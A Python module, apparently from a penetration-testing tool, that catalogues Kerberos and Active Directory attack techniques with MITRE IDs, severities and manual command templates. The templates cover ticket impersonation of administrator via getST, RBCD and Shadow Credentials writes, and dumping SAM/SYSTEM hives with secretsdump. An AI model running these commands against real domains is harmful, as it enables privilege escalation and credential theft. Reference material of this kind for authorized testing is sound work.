from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class KerberosTechnique:
    key: str
    title: str
    severity: str
    mitre_id: str
    summary: str
    manual_commands: tuple[str, ...]
    guide_key: str = "kerberos_adv"


KERBEROS_TECHNIQUES: dict[str, KerberosTechnique] = {
    "timeroast": KerberosTechnique(
        key="timeroast",
        title="Timeroasting",
        severity="medium",
        mitre_id="T1558.003",
        summary="Offline crack machine-account keys derived from pwdLastSet timestamps.",
        manual_commands=(
            "timeroast.py -d <DOMAIN> -u user -p pass --dc-ip <DC>",
            "nxc ldap <DC> -u user -p pass --timeroast",
        ),
    ),
    "unconstrained_delegation": KerberosTechnique(
        key="unconstrained_delegation",
        title="Unconstrained delegation",
        severity="high",
        mitre_id="T1558",
        summary="Coerce auth to delegated host, capture TGT from memory, impersonate.",
        manual_commands=(
            "PetitPotam / PrinterBug → delegated host",
            "Rubeus monitor /tgtdeleg or impacket getST",
        ),
    ),
    "constrained_delegation": KerberosTechnique(
        key="constrained_delegation",
        title="Constrained delegation",
        severity="high",
        mitre_id="T1558",
        summary="Request S4U2Self/S4U2Proxy service tickets to allowed targets.",
        manual_commands=(
            "getST.py -spn <target_spn> -impersonate administrator "
            "-dc-ip <DC> <DOMAIN>/user:pass",
        ),
    ),
    "constrained_pt": KerberosTechnique(
        key="constrained_pt",
        title="Constrained delegation (protocol transition)",
        severity="high",
        mitre_id="T1558",
        summary="Protocol transition allows S4U from any user to delegated SPNs.",
        manual_commands=(
            "getST.py -spn <target_spn> -impersonate administrator "
            "-hashes :<hash> <DOMAIN>/computer$",
        ),
    ),
    "rbcd": KerberosTechnique(
        key="rbcd",
        title="Resource-based constrained delegation",
        severity="high",
        mitre_id="T1134.001",
        summary="Write msDS-AllowedToActOnBehalfOfOtherIdentity on target computer.",
        manual_commands=(
            "rbcd.py -action write -delegate-from <attacker$> -delegate-to <target$>",
            "getST.py -spn cifs/<target> -impersonate administrator ...",
        ),
    ),
    "shadow_credentials": KerberosTechnique(
        key="shadow_credentials",
        title="Shadow Credentials",
        severity="high",
        mitre_id="T1098",
        summary="Add msDS-KeyCredentialLink (GenericWrite) for PKINIT takeover.",
        manual_commands=(
            "pywhisker -d <DOMAIN> -u user -p pass --target <target> -a add",
            "certipy auth -pfx <pfx> -dc-ip <DC>",
        ),
    ),
    "backup_operators": KerberosTechnique(
        key="backup_operators",
        title="Backup Operators",
        severity="high",
        mitre_id="T1098",
        summary="Backup Operators can read registry hives on domain controllers.",
        manual_commands=(
            "diskshadow + reg save HKLM\\SAM / reg save HKLM\\SYSTEM on DC",
            "impacket secretsdump -sam sam.hive -system system.hive LOCAL",
        ),
    ),
}


def technique_meta(key: str) -> KerberosTechnique:
    return KERBEROS_TECHNIQUES.get(
        key,
        KerberosTechnique(
            key=key,
            title=key.replace("_", " ").title(),
            severity="medium",
            mitre_id="T1558",
            summary=f"Kerberos technique: {key}",
            manual_commands=("guide kerberos_adv",),
        ),
    )
